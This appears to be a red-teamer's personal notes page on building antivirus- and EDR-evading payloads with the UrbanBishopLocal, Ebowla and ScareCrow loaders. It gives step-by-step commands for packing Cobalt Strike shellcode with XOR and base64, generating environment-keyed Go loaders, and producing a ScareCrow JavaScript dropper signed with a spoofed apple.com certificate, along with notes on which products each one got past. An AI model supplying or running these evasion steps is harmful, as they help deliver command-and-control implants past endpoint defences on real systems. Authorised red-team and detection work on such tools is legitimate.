00_Intro

I keep playing with different payloads as they come across twitter, they are usually good for a day or 2 max then Defender / everyone else starts catching it, figure I spent time playing with each of them so best to document it somewhere. Need to play with other general shellcode loaders and examples i have from the mr-un1kod3r course: https://github.com/Mr-Un1k0d3r/Shellcoding

urbanbishop ebowla scarecrow pezor alaris

urbanbishop

https://github.com/slyd0g/UrbanBishopLocal

Super simple - git clone, make raw payload in cobalt strike, convert it, add it to the VS project and replace the XOR key, build for x64.

Got past S1 but no luck with cr0wdstrike or defender

[Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$PSScriptRoot\encrypted_shellcode.bin")) | clip
  1. Copy base64 string into Program.cs
  2. Replace your XOR key within Program.cs
  3. Build the project for x64

ebowla

Oldie but a goodie https://github.com/Genetic-Malware/Ebowla

environment setup first due to kali python3 issues, stealing from https://www.kali.org/docs/general-use/using-eol-python-versions/

sudo apt install -y build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python3-openssl git

curl https://pyenv.run | bash

echo 'export PYENV\_ROOT="$HOME/.pyenv"' >> ~/.zshrc
echo 'export PATH="$PYENV\_ROOT/bin:$PATH"' >> ~/.zshrc
echo -e 'if command -v pyenv 1>/dev/null 2>&1; then\n  eval "$(pyenv init -)"\nfi' >> ~/.zshrc
exec $SHELL
pyenv install 2.7.18
pyenv versions
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
python2 get-pip.py

Customize: edit genetic.config


output_type = GO
clean_output = True
[[ENV_VAR]]
    windir = 'C:\Windows'

Build the payload with:

./ebowla.py /path/to/shellcode genetic.config

./build_x64_go.sh output/generated_file something_legit.exe

scarecrow

https://github.com/optiv/ScareCrow.git

apt install openssl osslsigncode mingw-w64

go get github.com/fatih/color
go get github.com/yeka/zip
go get github.com/josephspurrier/goversioninfo

go build ScareCrow.go

./ScareCrow -I ./payload.bin -domain apple.com -Loader wscript -O scary.js

JS payload did pretty good running with “wscript scary.js”, have to watch and kill the wscript process if you need to run it again

this is the only one i’ve tried so far but I’ll update here as i play with others
